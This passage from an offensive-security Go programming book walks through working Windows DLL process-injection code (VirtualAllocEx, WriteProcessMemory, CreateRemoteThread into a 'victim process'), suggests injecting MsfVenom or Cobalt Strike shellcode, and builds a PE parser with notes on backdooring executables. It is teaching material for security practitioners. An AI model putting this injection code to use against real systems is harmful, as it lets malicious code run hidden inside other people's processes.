        return errors.Wrap(lastErr, "[!] ERROR : Can't Allocate Memory On Remote Process.")&#13;
    }&#13;
    i.Lpaddr = lpBaseAddress&#13;
    fmt.Printf("[+] Base memory address: %v\n", unsafe.Pointer(i.Lpaddr))&#13;
    return nil&#13;
}</pre>&#13;
<p class="caption" id="ch12list8"><em>Listing 12-8: Allocating a region of memory in the remote process via</em> <span class="codeitalic">VirtualAllocEx</span> (<a href="https://github.com/blackhat-go/bhg/blob/master/ch-12/procInjector/winsys/inject.go">/ch-12/procInjector /winsys/inject.go</a>)</p>&#13;
<p class="indent">Unlike the previous <span class="literal">OpenProcess()</span> system call, we introduce a new detail via the <span class="literal">nullRef</span> variable <span class="ent">❶</span>. The <span class="literal">nil</span> keyword is reserved by Go for all <span class="literal">null</span> intents. However, it’s a typed value, which means that passing it directly via a <span class="literal">syscall</span> without a type will result in either a runtime error or a type-conversion error—either way, a bad situation. The fix is simple in this case: we declare a variable that resolves to a <span class="literal">0</span> value, such as an integer. The <span class="literal">0</span> value can now be reliably passed and interpreted as a <span class="literal">null</span> value by the receiving Windows function.</p>&#13;
<h4 class="h4" id="ch12lev2sec4">Writing to Memory with the WriteProcessMemory Windows API</h4>&#13;
<p class="noindent">Next, we’ll use the <span class="literal">WriteProcessMemory()</span> function to write to the remote process’s memory region previously initialized using the <span class="literal">VirtualAllocEx()</span> function. In <a href="ch12.xhtml#ch12list9">Listing 12-9</a>, we’ll keep things simple by calling a DLL by file path, rather than writing the entire DLL code into memory.</p>&#13;
<pre>func WriteProcessMemory(i *Inject) error {&#13;
    var nBytesWritten *byte&#13;
    dllPathBytes, err := syscall.BytePtrFromString(i.DllPath) <span class="ent">❶</span>&#13;
    if err != nil {&#13;
        return err&#13;
    }&#13;
    writeMem, _, lastErr := ProcWriteProcessMemory.Call(&#13;
        i.RemoteProcHandle, // HANDLE  hProcess&#13;
        i.Lpaddr, // LPVOID  lpBaseAddress&#13;
        uintptr(unsafe.Pointer(dllPathBytes)), // LPCVOID lpBuffer <span class="ent">❷</span>&#13;
        uintptr(i.DLLSize), // SIZE_T  nSize&#13;
        uintptr(unsafe.Pointer(nBytesWritten))) // SIZE_T  *lpNumberOfBytesWritten&#13;
    if writeMem == 0 {&#13;
        return errors.Wrap(lastErr, "[!] ERROR : Can't write to process memory.")&#13;
    }&#13;
    return nil&#13;
}</pre>&#13;
<p class="caption" id="ch12list9"><em>Listing 12-9: Writing the DLL file path to remote process memory (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-12/procInjector/winsys/inject.go">/ch-12/procInjector/winsys/inject.go</a><em>)</em></p>&#13;
<p class="indent">The first noticeable <span class="literal">syscall</span> function is <span class="literal">BytePtrFromString()</span> <span class="ent">❶</span>, which is a convenience function that consumes a <span class="literal">string</span> and returns the base index-0 pointer location of a <span class="literal">byte</span> slice, which we’ll assign to <span class="literal">dllPathBytes</span>.</p>&#13;
<p class="indent">Finally, we get to see <span class="literal">unsafe.Pointer</span> in action. The third argument to the <span class="literal">ProcWriteProcessMemory.Call</span> is defined within the Windows API specification <span epub:type="pagebreak" id="page_275"/>as “<span class="literal">lpBuffer</span>—a pointer to the buffer that contains data to be written in the address space of the specified process.” In order to pass the Go pointer value defined in <span class="literal">dllPathBytes</span> over to the receiving Windows function, we use <span class="literal">unsafe.Pointer</span> to circumvent type conversions. One final point to make here is that <span class="literal">uintptr</span> and <span class="literal">unsafe.Pointer</span> <span class="ent">❷</span> are acceptably safe, since both are being used inline and without the intent of assigning the return value to a variable for later reuse.</p>&#13;
<h4 class="h4" id="ch12lev2sec5">Finding LoadLibraryA with the GetProcessAddress Windows API</h4>&#13;
<p class="noindent"><em>Kernel32.dll</em> exports a function called <span class="literal">LoadLibraryA()</span>, which is available on all Windows versions. Microsoft documentation states that <span class="literal">LoadLibraryA()</span> “loads the specified module into the address space of the calling process. The specified module may cause other modules to be loaded.” We need to obtain the memory location of <span class="literal">LoadLibraryA()</span> before creating a remote thread necessary to execute our actual process injection. We can do this with the <span class="literal">GetLoadLibAddress()</span> function—one of those supporting functions mentioned earlier (<a href="ch12.xhtml#ch12list10">Listing 12-10</a>).</p>&#13;
<pre>func GetLoadLibAddress(i *Inject) error {&#13;
    var llibBytePtr *byte&#13;
    llibBytePtr, err := syscall.BytePtrFromString("LoadLibraryA") <span class="ent">❶</span>&#13;
    if err != nil {&#13;
        return err&#13;
    }&#13;
    lladdr, _, lastErr := ProcGetProcAddress.Call<span class="ent">❷</span>(&#13;
        ModKernel32.Handle(), // HMODULE hModule <span class="ent">❸</span>&#13;
        uintptr(unsafe.Pointer(llibBytePtr))) // LPCSTR lpProcName <span class="ent">❹</span>&#13;
    if &amp;lladdr == nil {&#13;
        return errors.Wrap(lastErr, "[!] ERROR : Can't get process address.")&#13;
    }&#13;
    i.LoadLibAddr = lladdr&#13;
    fmt.Printf("[+] Kernel32.Dll memory address: %v\n", unsafe.Pointer(ModKernel32.Handle()))&#13;
    fmt.Printf("[+] Loader memory address: %v\n", unsafe.Pointer(i.LoadLibAddr))&#13;
    return nil&#13;
}</pre>&#13;
<p class="caption" id="ch12list10"><em>Listing 12-10: Obtaining the</em> <span class="codeitalic">LoadLibraryA()</span> <em>memory address by using the</em> <span class="codeitalic">GetProcessAddress()</span> <em>Windows function (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-12/procInjector/winsys/inject.go">/ch-12/procInjector/winsys/inject.go</a><em>)</em></p>&#13;
<p class="indent">We use the <span class="literal">GetProcessAddress()</span> Windows function to identify the base memory address of <span class="literal">LoadLibraryA()</span> necessary to call the <span class="literal">CreateRemoteThread()</span> function. The <span class="literal">ProcGetProcAddress.Call()</span> <span class="ent">❷</span> function takes two arguments: the first is a handle to <span class="literal">Kernel32.dll</span> <span class="ent">❸</span> that contains the exported function we’re interested in (<span class="literal">LoadLibraryA()</span>), and the second is the base index-0 pointer location <span class="ent">❹</span> of a <span class="literal">byte</span> slice returned from the literal string <span class="literal">"LoadLibraryA"</span> <span class="ent">❶</span>.</p>&#13;
<h4 class="h4" id="ch12lev2sec6">Executing the Malicious DLL Using the CreateRemoteThread Windows API</h4>&#13;
<p class="noindent">We’ll use the <span class="literal">CreateRemoteThread()</span> Windows function to create a thread against the remote process’ virtual memory region. If that region happens <span epub:type="pagebreak" id="page_276"/>to be <span class="literal">LoadLibraryA()</span>, we now have a means to load and execute the region of memory containing the file path to our malicious DLL. Let’s review the code in <a href="ch12.xhtml#ch12list11">Listing 12-11</a>.</p>&#13;
<pre>func CreateRemoteThread(i *Inject) error {&#13;
    var threadId uint32 = 0&#13;
    var dwCreationFlags uint32 = 0&#13;
    remoteThread, _, lastErr := ProcCreateRemoteThread.Call<span class="ent">❶</span>(&#13;
        i.RemoteProcHandle, // HANDLE hProcess <span class="ent">❷</span>&#13;
        uintptr(nullRef), // LPSECURITY_ATTRIBUTES lpThreadAttributes&#13;
        uintptr(nullRef), // SIZE_T dwStackSize&#13;
        i.LoadLibAddr, // LPTHREAD_START_ROUTINE lpStartAddress <span class="ent">❸</span>&#13;
        i.Lpaddr, // LPVOID lpParameter <span class="ent">❹</span>&#13;
        uintptr(dwCreationFlags), // DWORD dwCreationFlags&#13;
        uintptr(unsafe.Pointer(&amp;threadId)), // LPDWORD lpThreadId&#13;
    )&#13;
    if remoteThread == 0 {&#13;
        return errors.Wrap(lastErr, "[!] ERROR : Can't Create Remote Thread.")&#13;
    }&#13;
    i.RThread = remoteThread&#13;
    fmt.Printf("[+] Thread identifier created: %v\n", unsafe.Pointer(&amp;threadId))&#13;
    fmt.Printf("[+] Thread handle created: %v\n", unsafe.Pointer(i.RThread))&#13;
    return nil&#13;
}</pre>&#13;
<p class="caption" id="ch12list11"><em>Listing 12-11: Executing the process injection by using the</em> <span class="codeitalic">CreateRemoteThread()</span> <em>Windows function (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-12/procInjector/winsys/inject.go">/ch-12 /procInjector/winsys/inject.go</a><em>)</em></p>&#13;
<p class="indent">The <span class="literal">ProcCreateRemoteThread.Call()</span> <span class="ent">❶</span> function takes a total of seven arguments, although we’ll use only three of them in this example. The relevant arguments are <span class="literal">RemoteProcHandle</span> <span class="ent">❷</span> containing the victim process’s handle, <span class="literal">LoadLibAddr</span> <span class="ent">❸</span> containing the start routine to be called by the thread (in this case, <span class="literal">LoadLibraryA()</span>), and, lastly, the pointer <span class="ent">❹</span> to the virtually allocated memory holding the payload location.</p>&#13;
<h4 class="h4" id="ch12lev2sec7">Verifying Injection with the WaitforSingleObject Windows API</h4>&#13;
<p class="noindent">We’ll use the <span class="literal">WaitforSingleObject()</span> Windows function to identify when a particular object is in a signaled state. This is relevant to process injection because we want to wait for our thread to execute in order to avoid bailing out prematurely. Let’s briefly discuss the function definition in <a href="ch12.xhtml#ch12list12">Listing 12-12</a>.</p>&#13;
<pre>func WaitForSingleObject(i *Inject) error {&#13;
    var dwMilliseconds uint32 = INFINITE&#13;
    var dwExitCode uint32&#13;
    rWaitValue, _, lastErr := ProcWaitForSingleObject.Call( <span class="ent">❶</span>&#13;
        i.RThread, // HANDLE hHandle&#13;
        uintptr(dwMilliseconds)) // DWORD  dwMilliseconds&#13;
    if rWaitValue != 0 {&#13;
        return errors.Wrap(lastErr, "[!] ERROR : Error returning thread wait state.")&#13;
    }&#13;
    success, _, lastErr := ProcGetExitCodeThread.Call( <span class="ent">❷</span>&#13;
<span epub:type="pagebreak" id="page_277"/>        i.RThread, // HANDLE  hThread&#13;
        uintptr(unsafe.Pointer(&amp;dwExitCode))) // LPDWORD lpExitCode&#13;
    if success == 0 {&#13;
        return errors.Wrap(lastErr, "[!] ERROR : Error returning thread exit code.")&#13;
    }&#13;
    closed, _, lastErr := ProcCloseHandle.Call(i.RThread) // HANDLE hObject <span class="ent">❸</span>&#13;
    if closed == 0 {&#13;
        return errors.Wrap(lastErr, "[!] ERROR : Error closing thread handle.")&#13;
    }&#13;
    return nil&#13;
}</pre>&#13;
<p class="caption" id="ch12list12"><em>Listing 12-12: Using the</em> <span class="codeitalic">WaitforSingleObject()</span> <em>Windows function to ensure successful thread execution (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-12/procInjector/winsys/inject.go">/ch-12/procInjector/winsys/inject.go</a><em>)</em></p>&#13;
<p class="indent">Three notable events are occurring in this code block. First, the <span class="literal">ProcWaitForSingleObject.Call()</span> system call <span class="ent">❶</span> is passed the thread handle returned in <a href="ch12.xhtml#ch12list11">Listing 12-11</a>. A wait value of <span class="literal">INFINITE</span> is passed as the second argument to declare an infinite expiration time associated with the event.</p>&#13;
<p class="indent">Next, <span class="literal">ProcGetExitCodeThread.Call()</span> <span class="ent">❷</span> determines whether the thread terminated successfully. If it did, the <span class="literal">LoadLibraryA</span> function should have been called, and our DLL will have been executed. Finally, as we do for the responsible cleanup of almost any handle, we passed the <span class="literal">ProcCloseHandle.Call()</span> system call <span class="ent">❸</span> so that that thread object handle closes cleanly.</p>&#13;
<h4 class="h4" id="ch12lev2sec8">Cleaning Up with the VirtualFreeEx Windows API</h4>&#13;
<p class="noindent">We use the <span class="literal">VirtualFreeEx()</span> Windows function to release, or decommit, the virtual memory that we allocated in <a href="ch12.xhtml#ch12list8">Listing 12-8</a> via <span class="literal">VirtualAllocEx()</span>. This is necessary to clean up memory responsibly, since initialized memory regions can be rather large, considering the overall size of the code being injected into the remote process, such as an entire DLL. Let’s take a look at this block of code (<a href="ch12.xhtml#ch12list13">Listing 12-13</a>).</p>&#13;
<pre>func VirtualFreeEx(i *Inject) error {&#13;
    var dwFreeType uint32 = MEM_RELEASE&#13;
    var size uint32 = 0 //Size must be 0 to MEM_RELEASE all of the region&#13;
    rFreeValue, _, lastErr := ProcVirtualFreeEx.Call<span class="ent">❶</span>(&#13;
        i.RemoteProcHandle, // HANDLE hProcess <span class="ent">❷</span>&#13;
        i.Lpaddr, // LPVOID lpAddress <span class="ent">❸</span>&#13;
        uintptr(size), // SIZE_T dwSize <span class="ent">❹</span>&#13;
        uintptr(dwFreeType)) // DWORD dwFreeType <span class="ent">❺</span>&#13;
    if rFreeValue == 0 {&#13;
        return errors.Wrap(lastErr, "[!] ERROR : Error freeing process memory.")&#13;
    }&#13;
    fmt.Println("[+] Success: Freed memory region")&#13;
    return nil&#13;
}</pre>&#13;
<p class="caption" id="ch12list13"><em>Listing 12-13: Freeing virtual memory by using the</em> <span class="codeitalic">VirtualFreeEx()</span> <em>Windows function (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-12/procInjector/winsys/inject.go">/ch-12/procInjector /winsys/inject.go</a><em>)</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_278"/>The <span class="literal">ProcVirtualFreeEx.Call()</span> function <span class="ent">❶</span> takes four arguments. The first is the remote process handle <span class="ent">❷</span> associated with the process that is to have its memory freed. The next argument is a pointer <span class="ent">❸</span> to the location of memory to be freed.</p>&#13;
<p class="indent">Notice that a variable named <span class="literal">size</span> <span class="ent">❹</span> is assigned a <span class="literal">0</span> value. This is necessary, as defined within the Windows API specification, to release the entire region of memory back into a reclaimable state. Finally, we pass the <span class="literal">MEM_RELEASE</span> operation <span class="ent">❺</span> to completely free the process memory (and our discussion on process injection).</p>&#13;
<h4 class="h4" id="ch12lev2sec9">Additional Exercises</h4>&#13;
<p class="noindent">Like many of the other chapters in this book, this chapter will provide the most value if you code and experiment along the way. Therefore, we conclude this section with a few challenges or possibilities to expand upon the ideas already covered:</p>&#13;
<ul>&#13;
<li><p class="noindent">One of the most important aspects of creating code injection is maintaining a usable tool chain sufficient for inspecting and debugging process execution. Download and install both the Process Hacker and Process Monitor tools. Then, using Process Hacker, locate the memory addresses of both <span class="literal">Kernel32</span> and <span class="literal">LoadLibrary</span>. While you’re at it, locate the process handle and take a look at the integrity level, along with inherent privileges. Now inject your code into the same victim process and locate the thread.</p></li>&#13;
<li><p class="noindent">You can expand the process injection example to be less trivial. For example, instead of loading the payload from a disk file path, use MsfVenom or Cobalt Strike to generate shellcode and load it directly into process memory. This will require you to modify <span class="literal">VirtualAllocEx</span> and <span class="literal">LoadLibrary</span>.</p></li>&#13;
<li><p class="noindent">Create a DLL and load the entire contents into memory. This is similar to the previous exercise: the exception is that you’ll be loading an entire DLL rather than shellcode. Use Process Monitor to set a path filter, process filter, or both, and observe the system DLL load order. What prevents DLL load order hijacking?</p></li>&#13;
<li><p class="noindent">You can use a project called Frida (<em><a href="https://www.frida.re/">https://www.frida.re/</a></em>) to inject the Google Chrome V8 JavaScript engine into the victim process. It has a strong following with mobile security practitioners as well as developers: you can use it to perform runtime analysis, in-process debugging, and instrumentation. You can also use Frida with other operating systems, such as Windows. Create your own Go code, inject Frida into a victim process, and use Frida to run JavaScript within the same process. Becoming familiar with the way Frida works will require some research, but we promise it’s well worth it.</p></li>&#13;
</ul>&#13;
<h3 class="h3" id="ch12lev1sec4"><span epub:type="pagebreak" id="page_279"/>The Portable Executable File</h3>&#13;
<p class="noindent">Sometimes we need a vehicle to deliver our malicious code. This could be a newly minted executable (delivered through an exploit in preexisting code), or a modified executable that already exists on the system, for example. If we wanted to modify an existing executable, we would need to understand the structure of the Windows <em>Portable Executable (PE)</em> file binary data format, as it dictates how to construct an executable, along with the executable’s capabilities. In this section, we’ll cover both the PE data structure and Go’s PE package, and build a PE binary parser, which you can use to navigate the structure of a PE binary.</p>&#13;
<h4 class="h4" id="ch12lev2sec10">Understanding the PE File Format</h4>&#13;
<p class="noindent">First, let’s discuss the PE data structure format. The Windows PE file format is a data structure most often represented as an executable, object code, or a DLL. The PE format also maintains references for all resources used during the initial operating system loading of the PE binary, including the export address table (EAT) used to maintain exported functions by ordinal, the export name table used to maintain exported functions by name, the import address table (IAT), import name table, thread local storage, and resource management, among other structures. You can find the PE format specification at <a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format/"><em>https://docs.microsoft.com/en-us/windows/win32/debug/pe-format/</em></a>. <a href="ch12.xhtml#ch12fig6">Figure 12-6</a> shows the PE data structure: a visual representation of a Windows binary.</p>&#13;
<div class="image"><img src="Images/12fig06.jpg" alt="Image" width="583" height="431"/></div>&#13;
<p class="figcap" id="ch12fig6"><em>Figure 12-6: The Windows PE file format</em></p>&#13;
<p class="indent">We will examine each of these top-down sections as we build out the PE parser.</p>&#13;
<h4 class="h4" id="ch12lev2sec11"><span epub:type="pagebreak" id="page_280"/>Writing a PE Parser</h4>&#13;
<p class="noindent">Throughout the following sections, we will write the individual parser components necessary to analyze each PE section within the Windows binary executable. As an example, we’ll use the PE format associated with the Telegram messaging application binary located at <a href="https://telegram.org"><em>https://telegram.org</em></a>, since this app is both less trivial than the often overused putty SSH binary example, and is distributed as a PE format. You can use almost any Windows binary executable, and we encourage you to investigate others.</p>&#13;
<h5 class="h5">Loading the PE binary and File I/O</h5>&#13;
<p class="noindent">In <a href="ch12.xhtml#ch12list14">Listing 12-14</a>, we’ll start by using the Go PE package to prepare the Telegram binary for further parsing. You can place all the code that we create when writing this parser in a single file within a <span class="literal">main()</span> function.</p>&#13;
<pre>import (&#13;
 <span class="ent">❶</span> "debug/pe"&#13;
    "encoding/binary"&#13;
    "fmt"&#13;
    "io"&#13;
    "log"&#13;
    "os"&#13;
)&#13;
&#13;
func main() {&#13;
 <span class="ent">❷</span> f, err := os.Open("Telegram.exe")&#13;
    check(err)&#13;
 <span class="ent">❸</span> pefile, err := pe.NewFile(f)&#13;
    check(err)&#13;
    defer f.Close()&#13;
    defer pefile.Close()</pre>&#13;
<p class="caption" id="ch12list14"><em>Listing 12-14: File I/O for PE binary (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-12/peParser/main.go">/ch-12/peParser/main.go</a><em>)</em></p>&#13;
<p class="indent">Prior to reviewing each of the PE structure components, we need to stub out the initial import <span class="ent">❶</span> and file I/O by using the Go PE package. We use <span class="literal">os.Open()</span> <span class="ent">❷</span> and then <span class="literal">pe.NewFile()</span> <span class="ent">❸</span> to create a file handle and a PE file object, respectively. This is necessary because we intend to parse the PE file contents by using a <span class="literal">Reader</span> object, such as a file or binary reader.</p>&#13;
<h5 class="h5">Parsing the DOS Header and the DOS Stub</h5>&#13;
<p class="noindent">The first section of the top-down PE data structure illustrated in <a href="ch12.xhtml#ch12fig6">Figure 12-6</a> starts with a DOS header. The following unique value is always present within any Windows DOS-based executable binary: <span class="literal">0x4D 0x5A</span> (or <span class="literal">MZ</span> in ASCII), which aptly declares the file as a Windows executable. Another value universally present on all PE files is located at offset <span class="literal">0x3C</span>. The value at this offset points to another offset containing the signature of a PE file: aptly, <span class="literal">0x50 0x45 0x00 0x00</span> (or <span class="literal">PE</span> in ASCII).</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_281"/>The header that immediately follows is the DOS Stub, which always provides the hex values for <span class="literal">This program cannot be run in DOS mode</span>; the exception to this occurs when a compiler’s <span class="literal">/STUB</span> linker option provides an arbitrary string value. If you take your favorite hex editor and open the Telegram application, it should be similar to <a href="ch12.xhtml#ch12fig7">Figure 12-7</a>. All of these values are present.</p>&#13;
<div class="image"><img src="Images/12fig07.jpg" alt="Image" width="858" height="504"/></div>&#13;
<p class="figcap" id="ch12fig7"><em>Figure 12-7: A typical PE binary format file header</em></p>&#13;
<p class="indent">So far, we have described the DOS Header and Stub while also looking at the hexadecimal representation through a hex editor. Now, let’s take a look at parsing those same values with Go code, as provided in <a href="ch12.xhtml#ch12list15">Listing 12-15</a>.</p>&#13;
<pre>    dosHeader := make([]byte, 96)&#13;
    sizeOffset := make([]byte, 4)&#13;
&#13;
    // Dec to Ascii (searching for MZ)&#13;
    _, err = f.Read(dosHeader) <span class="ent">❶</span>&#13;
    check(err)&#13;
    fmt.Println("[-----DOS Header / Stub-----]")&#13;
    fmt.Printf("[+] Magic Value: %s%s\n", string(dosHeader[0]), string(dosHeader[1])) <span class="ent">❷</span>&#13;
&#13;
    // Validate PE+0+0 (Valid PE format)&#13;
    pe_sig_offset := int64(binary.LittleEndian.Uint32(dosHeader[0x3c:])) <span class="ent">❸</span>&#13;
    f.ReadAt(sizeOffset[:], pe_sig_offset) <span class="ent">❹</span>&#13;
    fmt.Println("[-----Signature Header-----]")&#13;
    fmt.Printf("[+] LFANEW Value: %s\n", string(sizeOffset))&#13;
&#13;
/* OUTPUT&#13;
[-----DOS Header / Stub-----]&#13;
[+] Magic Value: MZ&#13;
[-----Signature Header-----]&#13;
[+] LFANEW Value: PE&#13;
*/</pre>&#13;
<p class="caption" id="ch12list15"><em>Listing 12-15: Parsing the DOS Header and Stub values (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-12/peParser/main.go">/ch-12/peParser/main.go</a><em>)</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_282"/>Starting from the beginning of the file, we use a Go <span class="literal">file</span> <span class="literal">Reader</span> <span class="ent">❶</span> instance to read 96 bytes onward in order to confirm the initial binary signature <span class="ent">❷</span>. Recall that the first 2 bytes provide the ASCII value <span class="literal">MZ</span>. The PE package offers convenience objects to help marshal PE data structures into something more easily consumable. It will, however, still require manual binary readers and bitwise functionality to get it there. We perform a binary read of the offset value <span class="ent">❸</span> referenced at <span class="literal">0x3c</span>, and then read exactly 4 bytes <span class="ent">❹</span> composed of the value <span class="literal">0x50 0x45</span> (<span class="literal">PE</span>) followed by 2 <span class="literal">0x00</span> bytes.</p>&#13;
<h5 class="h5">Parsing the COFF File Header</h5>&#13;
<p class="noindent">Continuing down the PE file structure, and immediately following the DOS Stub, is the COFF File Header. Let’s parse the COFF File Header by using the code defined in <a href="ch12.xhtml#ch12list16">Listing 12-16</a>, and then discuss some of its more interesting properties.</p>&#13;
<pre>  // Create the reader and read COFF Header&#13;
<span class="ent">❶</span> sr := io.NewSectionReader(f, 0, 1&lt;&lt;63-1)&#13;
<span class="ent">❷</span> _, err := sr.Seek(pe_sig_offset+4, os.SEEK_SET)&#13;
  check(err)&#13;
<span class="ent">❸</span> binary.Read(sr, binary.LittleEndian, &amp;pefile.FileHeader)</pre>&#13;
<p class="caption" id="ch12list16"><em>Listing 12-16: Parsing the COFF File Header (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-12/peParser/main.go">/ch-12/peParser/main.go</a><em>)</em></p>&#13;
<p class="indent">We create a new <span class="literal">SectionReader</span> <span class="ent">❶</span> that starts from the beginning of the file at position 0 and reads to the max value of an <span class="literal">int64</span>. Then the <span class="literal">sr.Seek()</span> function <span class="ent">❷</span> resets the position to start reading immediately, following the PE signature offset and value (recall the literal values <span class="literal">PE + 0x00 + 0x00</span>). Finally, we perform a binary read <span class="ent">❸</span> to marshal the bytes into the <span class="literal">pefile</span> object’s <span class="literal">FileHeader</span> struct. Recall that we created <span class="literal">pefile</span> earlier when we called <span class="literal">pe.Newfile()</span>.</p>&#13;
<p class="indent">The Go documentation defines <span class="literal">type FileHeader</span> with the struct defined in <a href="ch12.xhtml#ch12list17">Listing 12-17</a>. This struct aligns quite well with Microsoft’s documented PE COFF File Header format (defined at <a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#coff-file-header-object-and-image/"><em>https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#coff-file-header-object-and-image/</em></a>).</p>&#13;
<pre>type FileHeader struct {&#13;
        Machine              uint16&#13;
        NumberOfSections     uint16&#13;
        TimeDateStamp        uint32&#13;
        PointerToSymbolTable uint32&#13;
        NumberOfSymbols      uint32&#13;
        SizeOfOptionalHeader uint16&#13;
        Characteristics      uint16&#13;
}</pre>&#13;
<p class="caption" id="ch12list17"><em>Listing 12-17: The Go PE package’s native PE File Header struct</em></p>&#13;
<p class="indent">The single item to note in this struct outside of the <span class="literal">Machine</span> value (in other words, the PE target system architecture), is the <span class="literal">NumberOfSections</span> property. This property contains the number of sections defined within <span epub:type="pagebreak" id="page_283"/>the Section Table, which immediately follows the headers. You’ll need to update the <span class="literal">NumberOfSections</span> value if you intend to backdoor a PE file by adding a new section. However, other strategies may not require updating this value, such as searching other executable sections (such as <span class="literal">CODE</span>, <span class="literal">.text</span>, and so on) for contiguous unused <span class="literal">0x00</span> or <span class="literal">0xCC</span> values (a method to locate sections of memory that you can use to implant shellcode), as the number of sections remain unchanged.</p>&#13;
<p class="indent">In closing, you can use the following print statements to output some of the more interesting COFF File Header values (<a href="ch12.xhtml#ch12list18">Listing 12-18</a>).</p>&#13;
<pre>    // Print File Header&#13;
    fmt.Println("[-----COFF File Header-----]")&#13;
    fmt.Printf("[+] Machine Architecture: %#x\n", pefile.FileHeader.Machine)&#13;
    fmt.Printf("[+] Number of Sections: %#x\n", pefile.FileHeader.NumberOfSections)&#13;
    fmt.Printf("[+] Size of Optional Header: %#x\n", pefile.FileHeader.SizeOfOptionalHeader)&#13;
    // Print section names&#13;
    fmt.Println("[-----Section Offsets-----]")&#13;
    fmt.Printf("[+] Number of Sections Field Offset: %#x\n", pe_sig_offset+6) <span class="ent">❶</span>&#13;
    // this is the end of the Signature header (0x7c) + coff (20bytes) + oh32 (224bytes)&#13;
    fmt.Printf("[+] Section Table Offset: %#x\n", pe_sig_offset+0xF8)&#13;
&#13;
 /* OUTPUT&#13;
[-----COFF File Header-----]&#13;
[+] Machine Architecture: 0x14c <span class="ent">❷</span>&#13;
[+] Number of Sections: 0x8 <span class="ent">❸</span>&#13;
[+] Size of Optional Header: 0xe0 <span class="ent">❹</span>&#13;
[-----Section Offsets-----]&#13;
[+] Number of Sections Field Offset: 0x15e <span class="ent">❺</span>&#13;
[+] Section Table Offset: 0x250 <span class="ent">❻</span>&#13;
*/</pre>&#13;
<p class="caption" id="ch12list18"><em>Listing 12-18: Writing COFF File Header values to terminal output (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-12/peParser/main.go">/ch-12/peParser/main.go</a><em>)</em></p>&#13;
<p class="indent">You can locate the <span class="literal">NumberOfSections</span> value by calculating the offset of the PE signature + 4 bytes + 2 bytes—in other words, by adding 6 bytes. In our code, we already defined <span class="literal">pe_sig_offset,</span> so we’d just add 6 bytes to that value <span class="ent">❶</span>. We’ll discuss sections in more detail when we examine the Section Table structure.</p>&#13;
<p class="indent">The produced output describes the <span class="literal">Machine Architecture</span> <span class="ent">❷</span> value of <span class="literal">0x14c</span>: an <span class="literal">IMAGE_FILE_MACHINE_I386</span> as detailed in <a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#machine-types"><em>https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#machine-types</em></a>. The number of sections <span class="ent">❸</span> is <span class="literal">0x8</span>, dictating that eight entries exist within the Section Table. The Optional Header (which will be discussed next) has a variable length depending on architecture: the value is <span class="literal">0xe0</span> (224 in decimal), which corresponds to a 32-bit system <span class="ent">❹</span>. The last two sections can be considered more of convenience output. Specifically, the <span class="literal">Sections Field Offset</span> <span class="ent">❺</span> provides the offset to the number of sections, while the <span class="literal">Section Table Offset</span> <span class="ent">❻</span> provides the offset for the location of the Section Table. Both offset values would require modification if adding shellcode, for example.</p>&#13;
<h5 class="h5"><span epub:type="pagebreak" id="page_284"/>Parsing the Optional Header</h5>&#13;
<p class="noindent">The next header in the PE file structure is the <em>Optional Header</em>. An executable binary image will have an Optional Header that provides important data to the loader, which loads the executable into virtual memory. A lot of data is contained within this header, so we’ll cover only a few items in order to get you used to navigating this structure.</p>&#13;
<p class="indent">To get started, we need to perform a binary read of the relevant byte length based on architecture, as described in <a href="ch12.xhtml#ch12list19">Listing 12-19</a>. If you were writing more comprehensive code, you’d want to check architectures (for example, <span class="literal">x86</span> versus <span class="literal">x86_64</span>) throughout in order to use the appropriate PE data structures.</p>&#13;
<pre>  // Get size of OptionalHeader&#13;
<span class="ent">❶</span> var sizeofOptionalHeader32 = uint16(binary.Size(pe.OptionalHeader32{}))&#13;
<span class="ent">❷</span> var sizeofOptionalHeader64 = uint16(binary.Size(pe.OptionalHeader64{}))&#13;
<span class="ent">❸</span> var oh32 pe.OptionalHeader32&#13;
<span class="ent">❹</span> var oh64 pe.OptionalHeader64&#13;
&#13;
  // Read OptionalHeader&#13;
  switch pefile.FileHeader.SizeOfOptionalHeader {&#13;
  case sizeofOptionalHeader32:&#13;
   <span class="ent">❺</span> binary.Read(sr, binary.LittleEndian, &amp;oh32)&#13;
  case sizeofOptionalHeader64:&#13;
      binary.Read(sr, binary.LittleEndian, &amp;oh64)&#13;
  }</pre>&#13;
<p class="caption" id="ch12list19"><em>Listing 12-19: Reading the Optional Header bytes (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-12/peParser/main.go">/ch-12/peParser/main.go</a><em>)</em></p>&#13;
<p class="indent">In this code block, we’re initializing two variables, <span class="literal">sizeOfOptionalHeader32</span> <span class="ent">❶</span> and <span class="literal">sizeOfOptionalHeader64</span> <span class="ent">❷</span>, with 224 bytes and 240 bytes, respectively. This is an <span class="literal">x86</span> binary, so we’ll use the former variable in our code. Immediately following the variable declarations are initializations of <span class="literal">pe.OptionalHeader32</span> <span class="ent">❸</span> and <span class="literal">pe.OptionalHeader64</span> <span class="ent">❹</span> interfaces, which will contain the <span class="literal">OptionalHeader</span> data. Finally, we perform the binary read <span class="ent">❺</span> and marshal it to the relevant data structure: the <span class="literal">oh32</span> based on a 32-bit binary.</p>&#13;
<p class="indent">Let’s describe some of the more notable items of the Optional Header. The corresponding print statements and subsequent output are provided in <a href="ch12.xhtml#ch12list20">Listing 12-20</a>.</p>&#13;
<pre>    // Print Optional Header&#13;
    fmt.Println("[-----Optional Header-----]")&#13;
    fmt.Printf("[+] Entry Point: %#x\n", oh32.AddressOfEntryPoint)&#13;
    fmt.Printf("[+] ImageBase: %#x\n", oh32.ImageBase)&#13;
    fmt.Printf("[+] Size of Image: %#x\n", oh32.SizeOfImage)&#13;
